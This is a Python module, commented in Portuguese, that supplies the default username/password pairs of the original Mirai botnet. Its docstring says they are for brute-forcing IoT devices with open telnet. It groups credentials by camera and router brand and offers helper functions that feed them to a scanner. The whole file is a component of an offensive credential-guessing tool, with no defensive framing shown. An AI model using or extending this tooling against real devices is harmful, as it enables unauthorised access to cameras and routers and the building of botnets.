#!/usr/bin/env python3
"""
62 credenciais padrão do Mirai original.
Usadas para brute force em dispositivos IoT com telnet aberto.
"""

# Formato: (username, password)
DEFAULT_CREDS = [
    # (username, password) - tuplas
    ("root", "xc3511"),
    ("root", "vizxv"),
    ("root", "admin"),
    ("root", "888888"),
    ("root", "xmhdipc"),
    ("root", "default"),
    ("root", "juantech"),
    ("root", "123456"),
    ("root", "54321"),
    ("root", "12345"),
    ("root", "pass"),
    ("root", "1234"),
    ("root", "666666"),
    ("root", "p@ssw0rd"),
    ("root", "klv123"),
    ("root", "klv1234"),
    ("root", "Zte521"),
    ("root", "hi3518"),
    ("root", "jvbzd"),
    ("root", "anko"),
    ("root", "zlxx."),
    ("root", "7ujMko0vizxv"),
    ("root", "7ujMko0admin"),
    ("root", "system"),
    ("root", "ikwb"),
    ("root", "dreambox"),
    ("root", "user"),
    ("root", "realtek"),
    ("root", "0"),
    ("root", "root"),
    ("admin", "admin"),
    ("admin", "123456"),
    ("admin", "12345"),
    ("admin", "1234"),
    ("admin", "pass"),
    ("admin", "p@ssw0rd"),
    ("support", "support"),
    ("user", "user"),
    ("user", "pass"),
    ("service", "service"),
    ("supervisor", "supervisor"),
    ("guest", "guest"),
    ("guest", "12345"),
    ("guest", "1234"),
    ("guest", "123456"),
    ("admin1", "admin1"),
    ("administrator", "administrator"),
    ("666666", "666666"),
    ("888888", "888888"),
    ("ubnt", "ubnt"),
    ("root", "klv123456"),
    ("root", "00000000"),
    ("root", "1111111"),
    ("root", "11111111"),
    ("root", "11223344"),
    ("root", "41414141"),
    ("root", "123456789"),
    ("root", "12345678"),
    ("root", "1234567"),
    ("root", "default_password"),
    ("root", "Alcatel_12345"),
    ("root", "Alcatel1234"),
]

# Agrupadas por marca para referência
CREDS_BY_BRAND = {
    "hikvision": [("root", "12345"), ("root", "123456")],
    "dahua": [("root", "vizxv"), ("root", "7ujMko0vizxv")],
    "huawei": [("root", "Zte521"), ("root", "Admin123")],
    "zyxel": [("root", "1234"), ("admin", "1234")],
    "tp-link": [("admin", "admin"), ("admin", "1234")],
    "d-link": [("admin", "admin"), ("root", "root")],
    "intelbras": [("admin", "admin"), ("root", "123456")],
    "multilaser": [("admin", "admin"), ("root", "admin")],
    "cisco": [("root", "cisco"), ("admin", "cisco")],
}

# Organizado como lista de dicionários para o scanner
CREDENTIALS = [
    {"username": u, "password": p}
    for u, p in DEFAULT_CREDS
]


def get_creds() -> list:
    """Retorna lista de credenciais."""
    return CREDENTIALS


def get_creds_by_brand(brand: str) -> list:
    """Retorna credenciais de uma marca específica."""
    return [
        {"username": u, "password": p}
        for u, p in CREDS_BY_BRAND.get(brand.lower(), [])
    ]


def add_cred(username: str, password: str):
    """Adiciona nova credencial à lista."""
    CREDENTIALS.append({"username": username, "password": password})


if __name__ == '__main__':
    print(f"[*] Total de credenciais: {len(CREDENTIALS)}")
    print(f"[*] Marcas disponíveis: {list(CREDS_BY_BRAND.keys())}")
    for i, cred in enumerate(CREDENTIALS[:10]):
        print(f"  {i+1}. {cred['username']}:{cred['password']}")
    print(f"  ... mais {len(CREDENTIALS) - 10} credenciais")
